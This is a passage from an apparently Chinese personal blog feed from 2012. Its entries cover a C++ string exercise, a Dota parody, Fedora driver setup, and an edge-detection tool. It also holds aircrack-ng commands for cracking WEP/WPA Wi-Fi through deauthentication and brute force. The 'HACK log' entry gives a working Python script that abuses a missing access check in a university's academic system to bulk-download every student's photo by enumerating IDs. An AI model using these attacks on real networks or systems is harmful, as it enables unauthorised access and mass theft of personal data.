        <content type="html"><![CDATA[<p>昨天参加了一次笔试，最后一道题是这样的：找出一个纯字母字符串中第一个只出现一次的字符。</p><p>我的思路是这样的，假设该字符串是由纯小写字母组成，则可以定义一个布尔数组，该数组保存每个字符出现次数是否大于 1 的状态。接着遍历字符串，同时利用 ASCII 码对应到布尔数组，判断状态即可。鄙人的 C++ 代码如下：</p><a id="more"></a><figure class="highlight cpp hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;cassert&gt;</span></span></span><br><span class="line"><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">char</span> <span class="hljs-title">FirstAppearOnce</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* str)</span> </span>&#123;</span><br><span class="line">    <span class="hljs-keyword">bool</span> moreThanOnce[<span class="hljs-number">26</span>] = &#123;<span class="hljs-literal">false</span>&#125;;</span><br><span class="line">    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">char</span>* p = str; *p != <span class="hljs-string">'\0'</span>; ++p) &#123;</span><br><span class="line">        assert((*p &gt;= <span class="hljs-string">'a'</span>) &amp;&amp; (*p &lt;= <span class="hljs-string">'z'</span>));</span><br><span class="line">        <span class="hljs-keyword">char</span>* q;</span><br><span class="line">        <span class="hljs-keyword">for</span> (q = p + <span class="hljs-number">1</span>; !moreThanOnce[*p - <span class="hljs-string">'a'</span>] &amp;&amp; (*q != <span class="hljs-string">'\0'</span>); ++q) &#123;</span><br><span class="line">            <span class="hljs-keyword">if</span> (*q == *p) &#123;</span><br><span class="line">                moreThanOnce[*p - <span class="hljs-string">'a'</span>] = <span class="hljs-literal">true</span>;</span><br><span class="line">                <span class="hljs-keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="hljs-keyword">if</span> (*q == <span class="hljs-string">'\0'</span>) &#123;</span><br><span class="line">            <span class="hljs-keyword">return</span> *p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;</span><br><span class="line">    <span class="hljs-keyword">char</span>* str = <span class="hljs-string">"thisisateststring"</span>;</span><br><span class="line">    <span class="hljs-built_in">cout</span> &lt;&lt; FirstAppearOnce(str) &lt;&lt; <span class="hljs-built_in">endl</span>; </span><br><span class="line">    system(<span class="hljs-string">"pause"</span>);</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果存在大小 写、符号等情况，则可以为 整个 ASCII 字符创建一个布尔数组（ASCII 有 128 个字符，因此数组可改为 128 个元素 ） 。对上面代码稍稍修改一下，便可以支持所有字符：</p><figure class="highlight cpp hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">char</span> <span class="hljs-title">FirstAppearOnce</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* str)</span> </span>&#123;</span><br><span class="line">    <span class="hljs-keyword">bool</span> moreThanOnce[<span class="hljs-number">128</span>] = &#123;<span class="hljs-literal">false</span>&#125;;</span><br><span class="line">    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">char</span>* p = str; *p != <span class="hljs-string">'\0'</span>; ++p) &#123;</span><br><span class="line">        <span class="hljs-keyword">char</span>* q;</span><br><span class="line">        <span class="hljs-keyword">for</span> (q = p + <span class="hljs-number">1</span>; !moreThanOnce[*p] &amp;&amp; (*q != <span class="hljs-string">'\0'</span>); ++q) &#123;</span><br><span class="line">            <span class="hljs-keyword">if</span> (*q == *p) &#123;</span><br><span class="line">                moreThanOnce[*p] = <span class="hljs-literal">true</span>;</span><br><span class="line">                <span class="hljs-keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="hljs-keyword">if</span> (*q == <span class="hljs-string">'\0'</span>) &#123;</span><br><span class="line">            <span class="hljs-keyword">return</span> *p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;</span><br><span class="line">    <span class="hljs-keyword">char</span>* str = <span class="hljs-string">"This is a test string."</span>;</span><br><span class="line">    <span class="hljs-built_in">cout</span> &lt;&lt; FirstAppearOnce(str) &lt;&lt; <span class="hljs-built_in">endl</span>; </span><br><span class="line">    system(<span class="hljs-string">"pause"</span>);</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>欢迎拍砖。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 原创 </tag>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>我是火枪，我想打 DPS</title>
      <link href="/hexo-blog/20121016/%E6%88%91%E6%98%AF%E7%81%AB%E6%9E%AA%EF%BC%8C%E6%88%91%E6%83%B3%E6%89%93-DPS/"/>
      <url>/hexo-blog/20121016/%E6%88%91%E6%98%AF%E7%81%AB%E6%9E%AA%EF%BC%8C%E6%88%91%E6%83%B3%E6%89%93-DPS/</url>
      
        <content type="html"><![CDATA[<p>我把简历递给考官时，感到自己的白胡子因为紧张而微微发抖。<br>跟其他毕业生一样，我需要一份工作。</p><a id="more"></a><p>“矮人狙击手。通过使用熟练的射击技术和我信赖的火枪，我能对远处的敌人实施系统的破坏。通过对最容易遭受攻击的区域的细致瞄准，我能够对敌人造成严重的伤害，只需要一 小段时间，我就可以用人们所熟知的那种方法（狙击）来除掉一个对手。我的火枪配有第2弹管，可以用来发射榴散弹，在近处的区域造成大量伤害。”面试官慢慢读着简历上我的自我简介，道，“这么说来，你是来应聘DPS的？”<br>我点头。<br>“你的特长是什么？”考官问。<br>“我是远程，我是敏捷英雄，我是远程。我是后期。我够猥琐。”<br>“猥琐？”考官不解，”这是优点？”<br>“就是前期很会提防gank。”我解释道。<br>“这样啊。你有留人技能吗。”<br>“我的爆头可以打断别人TP。45%概率0.01秒晕眩。”我说。<br>“像我们公司的虚空假面和鱼人守卫可以晕住别人1到2秒。你这个有点不够达标。”考官说。<br>“如果公司需要，我可以出碎骨锤。”我说。<br>“你有保命技能吗。”<br>“保住性命的最好办法就是在别人杀你之前你依靠意识和走位还有操作反杀之。”我说。<br>“我问你有保命技能吗。有还是没有？”<br>“呃，没有。”<br>“我们公司的dps一般都要求有逃生技能。譬如虚空假面和敌法师的闪烁，骷髅王的重生什么的。”<br>“如果公司需要，我可以出洛萨之锋。”我说。<br>“你团战作用怎么样。”考官问。<br>“我的弹幕可以减速，顺带dot伤害。”我说。<br>“不能群晕么。”考官说。<br>“应该不能吧。”<br>“你的弹幕有给团队带来的增益吗？”<br>“呃。没有。”<br>“我们公司暗牧的大招团战时候可以给我们加护甲，给对面减甲。”<br>“如果公司需要，我可以出梅肯。”我摸摸额头上的汗。<br>“你够肉吗。”<br>“呃，我的职责更应该是全力输出。”<br>“站不住的DPS连尸体都不如，你听说过这句话吗，年轻人？”<br>“如果公司需要，我可以出先锋盾和跳刀，团战第一时间切入，吸收伤害和技能。”我说。<br>“嗯。你的薪酬要求是多少？”<br>“20分钟前可以有出假腿的钱。”我不敢多说。<br>“工作待遇要求呢？”<br>“我只要野区的狗头人一家作为最低保障。”<br>“年轻人，”考官这时说道，“我们考察了一下，你是一名有志于做dps的人。但是你的祖籍是近卫，怎么会想到来我们天灾集团求职呢.”<br>“我爸妈手速慢，生我的时候没有抢到近卫5楼。所以我的户口算是天灾的。”我说。<br>“你要知道，我们公司是本地生源优先的哦。”考官说。<br>“我懂。但我可以待遇比本地户口的天灾人员低一些。只要贵公司给我打dps的机会。”我说。<br>“我们会好好考虑的。你可以回去了，等我们的通知。”</p><p>离开冰封王座的时候，我还是不由打了个冷战。我急需这份工作。但我的竞争者很强。即便我幸运地被录用了，也得比别人做更高强度的工作。我要打钱快，前期压人，中期gank，后期超神。我要在团战的时候吸收伤害，然后先手控制住对面的C，秒掉法师，收割dps。我还要用梅肯给队友加血，包鸡包眼包雾，让野，拆眼。等等，这还是原来的我么？<br>上大学的时候，系主任说后期dps系是最吃香的，是天之骄子。四年以后，6.5x变成了6.7x，形势大变，环境已经不容许我们后期闲云野鹤了。像我这种没有什么保命或者控制技能的dps，找工作是最难的。</p><p>我真羡慕那个高帅富的骷髅王，有锤子，有吸血，带暴击，还有两条命。周末的时候他和冰女去开f了。而我只有对着冰女的照片摸摸撸着。我也羡慕那个飘逸的影魔和蓝猫，国际企业展览会上总有他们的身影。我甚至羡慕VS，这小黑妹学的家政管理，包鸡包眼还要gank和换人，累是累了，但是好歹有份工作，混口饭吃。对了，冰女学的也是这个专业，因为有个回魔光环，俨然成了援gj一颗新星了。</p><p>想着想着，我不由叹了一口气，掏出最后一根艾西菲的远古祭祀，点着了一棵树，默默抽着。我可不像影魔他们，可以经常喝100大元一瓶的药膏。<br>我看到不远处，同班的小黑在低声啜泣。看来是面试遭拒了吧。她虽说射手天赋好，还有冰箭减速，可惜一个姑娘家身板太脆，再加上出身黑暗，尽管是正宗近卫户口，也难以找到工作。唉。同是天涯沦落人呐。<br>我走过去想安慰她。她抬头看我，道，你谁呀，矮矬穷？<br>我是火枪，我想打dps。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 转载 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>aircrack-ng 使用笔记</title>
      <link href="/hexo-blog/20121011/aircrack-ng-%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/"/>
      <url>/hexo-blog/20121011/aircrack-ng-%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p><strong>1. airmon-ng：激活网卡监听</strong></p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airmon-ng start wlan0</span><br></pre></td></tr></table></figure><p><strong>2. airodump-ng：捕获802.11数据报文，以便于破解</strong></p><p>无参数启动 airodump-ng 可查看所有接收范围内的AP、Client信息</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airodump-ng \[-w filename\] \[-c channel\] mon0</span><br></pre></td></tr></table></figure><p>其中，-w 后的参数为保存的文件名，-c 后的参数为频段</p><a id="more"></a><p><strong>3. aireplay-ng：根据需要创建特殊的无线网络数据报文</strong></p><p><em><strong>aireplay-ng -9：注入攻击链路质量测试</strong></em></p><p><strong>WEP:</strong></p><p><em><strong>aireplay-ng -1：伪认证联机请求攻击</strong></em></p><p>伪认证联机请求并发送保持在线数据</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aireplay-ng -1 6000 -o 1 -q 10 -e (bssid) -a (AP Mac) -h (Host Mac) mon0</span><br></pre></td></tr></table></figure><p><em><strong>aireplay-ng -3：ARP 攻击</strong></em></p><p>监听 ARP 报文，一旦出现就不断将该报文重发，使目标机器产生实际回应数据，发回更多IV数据。</p><p><strong>对于无机器连接的 WEP：</strong></p><p><em><strong>aireplay-ng -5：Fragmenation 攻击</strong></em></p><p>监听一个 AP 广播出来的数据包，并抽离有效的伪随机数据(PRGA)，保存到 fragment-XXXX-XXXXX.xor 文件供下一步使用。</p><p>有时监听到的不是广播包，转发攻击后 AP 没有回应，一系列重试后程序会重新监听；有时候可能需要不少时间，加 –F 参数可以自动应答。</p><p><em><strong>aireplay-ng -4：chopchop 攻击</strong></em></p><p>上述攻击不奏效可试，相同作用。</p><p><strong>WPA/WPA2:</strong></p><p><em><strong>aireplay-ng -0：Deauthentication 攻击</strong></em></p><p>往已经连接到 AP 的一个客户端伪造一个离线包，使其离线重连以便捕捉 handshake。注意要收到 ACK，才表明被攻击客户端收到，才会下线；发送离线不宜过密过多。</p><p><strong>4. aircrack-ng：暴力破解</strong></p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aircrack-ng \[-w dictionary\] *.cap</span><br></pre></td></tr></table></figure><p>暴力破解。其中，-w 参数为密码字典，破解的成功率取决于字典的覆盖程度以及机器的速度。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 原创 </tag>
            
            <tag> 黑客技术 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Fedora 17 安装无线网卡驱动</title>
      <link href="/hexo-blog/20120930/Fedora-17-%E5%AE%89%E8%A3%85%E6%97%A0%E7%BA%BF%E7%BD%91%E5%8D%A1%E9%A9%B1%E5%8A%A8/"/>
      <url>/hexo-blog/20120930/Fedora-17-%E5%AE%89%E8%A3%85%E6%97%A0%E7%BA%BF%E7%BD%91%E5%8D%A1%E9%A9%B1%E5%8A%A8/</url>
      
        <content type="html"><![CDATA[<p><strong>1. 首先添加 RPM Fusion 源</strong></p><p>一般情况下，Fedora 17 自带的软件源并不能满足我们的需求，有时在官方软件源搜索不到的软件，在 RPM Fusion 上往往可以搜索到（尤其是第三方软件与驱动）。因此，我们首先将 RPM Fusion 源添加到系统上：</p><p>参见：<a href="http://rpmfusion.org/Configuration" target="_blank" rel="noopener">http://rpmfusion.org/Configuration</a>，我们在终端中输入（针对于 Fedora 17）：</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su -c &apos;yum localinstall --nogpgcheck http://download1.rpmfusion.org/free/fedora/rpmfusion-free-release-stable.noarch.rpm http://download1.rpmfusion.org/nonfree/fedora/rpmfusion-nonfree-release-stable.noarch.rpm&apos;</span><br></pre></td></tr></table></figure><a id="more"></a><p><strong>2. 安装 kmod-wl 软件包</strong></p><p>添加了上面的软件源，我们就可以运行下面命令搜索第三方驱动包：</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum search kmod-wl</span><br></pre></td></tr></table></figure><p>接下来会显示一大坨 kmod-wl，分别对应不同的 Kernel 版本。</p><p>要知道本机的 Kernel 版本，运行：</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname -r</span><br></pre></td></tr></table></figure><p>在 serach 返回的结果中找到与之对应的 kmod-wl 版本，运行：</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo yum install kmod-wl-&#123;对应版本号&#125;</span><br></pre></td></tr></table></figure><p>重启计算机</p><p>注意：</p><p>1. 机器需要能上网（有线）</p><p>2. 需要管理员权限，如果用户不再管理员组需要先将其加入管理员组；或者使用 su 命令切换到 root 账户再操作。</p><p>3. kmod-wl 驱动包并不能保证支持所有的网卡型号，所以最重要的一点是要看人品，关于如何增加人品，请访问<a href="http://my.oschina.net/apoptosis/" target="_blank" rel="noopener">【这里】</a>。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 原创 </tag>
            
            <tag> Linux </tag>
            
            <tag> Fedora </tag>
            
            <tag> 操作系统 </tag>
            
            <tag> 运维 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【边缘检测 v0.7beta】——献给我的大学</title>
      <link href="/hexo-blog/20120831/%E3%80%90%E8%BE%B9%E7%BC%98%E6%A3%80%E6%B5%8B%20v0.7beta%E3%80%91%E2%80%94%E2%80%94%E7%8C%AE%E7%BB%99%E6%88%91%E7%9A%84%E5%A4%A7%E5%AD%A6/"/>
      <url>/hexo-blog/20120831/%E3%80%90%E8%BE%B9%E7%BC%98%E6%A3%80%E6%B5%8B%20v0.7beta%E3%80%91%E2%80%94%E2%80%94%E7%8C%AE%E7%BB%99%E6%88%91%E7%9A%84%E5%A4%A7%E5%AD%A6/</url>
      
        <content type="html"><![CDATA[<p><a href="https://en.wikipedia.org/wiki/Edge_detection" target="_blank" rel="noopener">边缘检测</a> v0.7beta</p><p>作者：whypro</p><a id="more"></a><p>下载地址：<a href="https://sourceforge.net/projects/edgedetection/" target="_blank" rel="noopener">https://sourceforge.net/projects/edgedetection/</a></p><p>软件功能：利用Canny、Sobel、Laplace算子以及<a href="https://en.wikipedia.org/wiki/Ant_colony_optimization_algorithms" target="_blank" rel="noopener">蚁群算法</a>对图像边缘进行检测、识别和提取。</p><p>献给<a href="https://www.xust.edu.cn/" target="_blank" rel="noopener">我的大学</a>。</p><p>By whypro</p><p>May 30, 2012</p>]]></content>
      
      
      
        <tags>
            
            <tag> 原创 </tag>
            
            <tag> 图像处理 </tag>
            
            <tag> 算法 </tag>
            
            <tag> 蚁群算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【正方教务管理系统】HACK日志（二）</title>
      <link href="/hexo-blog/20120701/%E3%80%90%E6%AD%A3%E6%96%B9%E6%95%99%E5%8A%A1%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E3%80%91HACK%E6%97%A5%E5%BF%97%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
      <url>/hexo-blog/20120701/%E3%80%90%E6%AD%A3%E6%96%B9%E6%95%99%E5%8A%A1%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E3%80%91HACK%E6%97%A5%E5%BF%97%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p>正方系统的一个漏洞是获取学生图片时没有对学生身份进行检测。理论上来说，获取学生李四的照片，需要首先判断登陆者身份是教师或者学生，如果是学生还要判断登陆者是否为李四本人，而正方系统在这一方面并没有做得很好，导致张三可以轻松地获取李四的照片。</p><p>下面是笔者编写的一个简单的爬虫程序，Python 代码如下（Python 3.2），</p><a id="more"></a><figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">import</span> http.client</span><br><span class="line"><span class="hljs-keyword">import</span> urllib</span><br><span class="line"><span class="hljs-keyword">import</span> os</span><br><span class="line"></span><br><span class="line">_xh = <span class="hljs-string">'**********'</span></span><br><span class="line">_pw = <span class="hljs-string">'**********'</span></span><br><span class="line">VIEWSTATE = <span class="hljs-string">'dDwtMTIwMTU3OTE3Nzs7PpxRSEGelcLnTaPgA3v56uoKweD+'</span></span><br><span class="line">host = <span class="hljs-string">'jwc.****.edu.cn:8989'</span></span><br><span class="line">main_url = <span class="hljs-string">'http://'</span> + host</span><br><span class="line">login_page = <span class="hljs-string">'/default2.aspx'</span></span><br><span class="line">login_url = main_url + login_page</span><br><span class="line">readimage_page = <span class="hljs-string">'/readimagexs.aspx'</span></span><br><span class="line">print(main_url)</span><br><span class="line">print(login_url)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">conn = http.client.HTTPConnection(host)</span><br><span class="line">login_post_data = urllib.parse.urlencode(&#123;</span><br><span class="line">    <span class="hljs-string">'__VIEWSTATE'</span>: VIEWSTATE,</span><br><span class="line">    <span class="hljs-string">'TextBox1'</span>: _xh,</span><br><span class="line">    <span class="hljs-string">'TextBox2'</span>: _pw,</span><br><span class="line">    <span class="hljs-string">'RadioButtonList1'</span>: <span class="hljs-string">'学生'</span>,</span><br><span class="line">    <span class="hljs-string">'Button1'</span>: <span class="hljs-string">''</span>,</span><br><span class="line">    <span class="hljs-string">'lbLanguage'</span>: <span class="hljs-string">''</span></span><br><span class="line">&#125;)</span><br><span class="line">login_post_data = login_post_data.encode(<span class="hljs-string">'utf-8'</span>)</span><br><span class="line">login_headers = &#123;</span><br><span class="line">    <span class="hljs-string">'Host'</span>: host,</span><br><span class="line">    <span class="hljs-string">'Connection'</span>: <span class="hljs-string">'keep-alive'</span>,</span><br><span class="line">    <span class="hljs-string">'Origin'</span>:main_url,</span><br><span class="line">    <span class="hljs-string">'User-Agent'</span>: <span class="hljs-string">'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.52 Safari/536.5'</span>,</span><br><span class="line">    <span class="hljs-string">'Content-Type'</span>: <span class="hljs-string">'application/x-www-form-urlencoded'</span>,</span><br><span class="line">    <span class="hljs-string">'Accept'</span>: <span class="hljs-string">'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'</span>,</span><br><span class="line">    <span class="hljs-string">'Referer'</span>: main_url,</span><br><span class="line">    <span class="hljs-string">'Accept-Encoding'</span>: <span class="hljs-string">'gzip,deflate,sdch'</span>,</span><br><span class="line">    <span class="hljs-string">'Accept-Language'</span>: <span class="hljs-string">'zh-CN,zh;q=0.8'</span>,</span><br><span class="line">    <span class="hljs-string">'Accept-Charset'</span>: <span class="hljs-string">'GBK,utf-8;q=0.7,*;q=0.3'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">conn.request(<span class="hljs-string">'POST'</span>, login_page, body = login_post_data, headers = login_headers)</span><br><span class="line">result = conn.getresponse()</span><br><span class="line">print(result.status)</span><br><span class="line"><span class="hljs-comment">#print(result.read())</span></span><br><span class="line">cookie = result.msg[<span class="hljs-string">'set-cookie'</span>].split(<span class="hljs-string">';'</span>)[<span class="hljs-number">0</span>]</span><br><span class="line"><span class="hljs-comment">#print(cookie)</span></span><br><span class="line">conn.close()</span><br><span class="line"></span><br><span class="line">readimage_headers = &#123;</span><br><span class="line">    <span class="hljs-string">'Host'</span>: host,</span><br><span class="line">    <span class="hljs-string">'Connection'</span>: <span class="hljs-string">'keep-alive'</span>,</span><br><span class="line">    <span class="hljs-string">'User-Agent'</span>: <span class="hljs-string">'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.52 Safari/536.5'</span>,</span><br><span class="line">    <span class="hljs-string">'Accept'</span>: <span class="hljs-string">'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'</span>,</span><br><span class="line">    <span class="hljs-string">'Accept-Encoding'</span>: <span class="hljs-string">'gzip,deflate,sdch'</span>,</span><br><span class="line">    <span class="hljs-string">'Accept-Language'</span>: <span class="hljs-string">'zh-CN,zh;q=0.8'</span>,</span><br><span class="line">    <span class="hljs-string">'Accept-Charset'</span>: <span class="hljs-string">'GBK,utf-8;q=0.7,*;q=0.3'</span>,</span><br><span class="line">    <span class="hljs-string">'Cookie'</span>: cookie</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">conn.request(<span class="hljs-string">'GET'</span>, <span class="hljs-string">'/xs_main.aspx'</span> + <span class="hljs-string">'?'</span> + <span class="hljs-string">'xh='</span> + _xh, headers = readimage_headers)</span><br><span class="line"><span class="hljs-comment">#result = conn.getresponse()</span></span><br><span class="line"><span class="hljs-comment">#print(result.status)</span></span><br><span class="line"><span class="hljs-comment">#print(result.read())</span></span><br><span class="line">conn.close()</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">for</span> year <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>, <span class="hljs-number">12</span>):<span class="hljs-comment">#11</span></span><br><span class="line">    <span class="hljs-keyword">for</span> college <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>, <span class="hljs-number">20</span>):<span class="hljs-comment">#19</span></span><br><span class="line">        <span class="hljs-keyword">for</span> major <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>, <span class="hljs-number">15</span>):<span class="hljs-comment">#14</span></span><br><span class="line">            <span class="hljs-keyword">for</span> mclass <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>, <span class="hljs-number">10</span>):</span><br><span class="line">                <span class="hljs-keyword">for</span> series <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>, <span class="hljs-number">50</span>):</span><br><span class="line">                    image_xh = <span class="hljs-string">"%02d%02d%02d%02d%02d"</span> % (year, college, major, mclass, series)</span><br><span class="line">                    readimage_url = readimage_page + <span class="hljs-string">'?'</span> + <span class="hljs-string">'xh='</span> + image_xh</span><br><span class="line">                    print(readimage_url)</span><br><span class="line">                    conn.request(<span class="hljs-string">'GET'</span>, readimage_url, headers = readimage_headers)</span><br><span class="line">                    result = conn.getresponse()</span><br><span class="line">                    <span class="hljs-comment">#print(result.status)</span></span><br><span class="line">                    image = result.read()</span><br><span class="line">                    <span class="hljs-keyword">if</span> len(image) &gt; <span class="hljs-number">1024</span>:</span><br><span class="line">                        save_path = os.path.join(os.path.abspath(<span class="hljs-string">'./pic/'</span>), image_xh + <span class="hljs-string">'.bmp'</span>)</span><br><span class="line">                        print(save_path)</span><br><span class="line">                        fp = open(save_path, <span class="hljs-string">'wb'</span>)</span><br><span class="line">                        fp.write(image)</span><br><span class="line">                        fp.close()</span><br><span class="line">                    <span class="hljs-keyword">else</span>:</span><br><span class="line">                        print(<span class="hljs-string">'skip'</span>)</span><br><span class="line">print(<span class="hljs-string">'done'</span>)</span><br><span class="line">conn.close()</span><br></pre></td></tr></table></figure><p>后记：正方的选课模块依然有这样的漏洞，因此理论上来说，偷窥别人的课程、暴力选课也照样可以实现。</p><p>2012-07-01<br>By whypro</p>]]></content>
      
      
      
        <tags>
            
            <tag> 原创 </tag>
            
            <tag> 爬虫 </tag>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【正方教务管理系统】HACK日志（一）</title>
      <link href="/hexo-blog/20120630/%E3%80%90%E6%AD%A3%E6%96%B9%E6%95%99%E5%8A%A1%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E3%80%91HACK%E6%97%A5%E5%BF%97%EF%BC%88%E4%B8%80%EF%BC%89/"/>
